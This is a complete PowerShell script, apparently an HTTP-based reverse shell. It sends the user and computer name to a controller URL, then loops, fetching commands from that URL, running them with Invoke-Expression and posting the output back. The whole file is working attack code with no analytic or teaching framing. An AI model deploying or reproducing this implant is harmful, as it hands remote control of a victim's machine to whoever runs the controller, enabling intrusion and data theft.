# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

$__url = "http://127.0.0.1:5000/"

$__params = @{output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params

while (1 -eq 1)
{
	$__cmd = ""
	
	try
	{
		$__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "cmd")).Content
	}
	catch
	{
		Sleep 1
		continue
	}
	
	if ($__cmd -eq "")
	{
		Sleep 3
		continue
	}
	
	$__result = ""
	$__err = ""
	
	try
	{
		$__result = (iex $__cmd 2>&1 | Out-String)
	}
	catch
	{
		Write-Error $_
		$__err = $_
	}

	$__output = $__result + $__err
	
	$__params = @{output = $__output + "`nPS " + (pwd).Path + "> "}
	$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
}
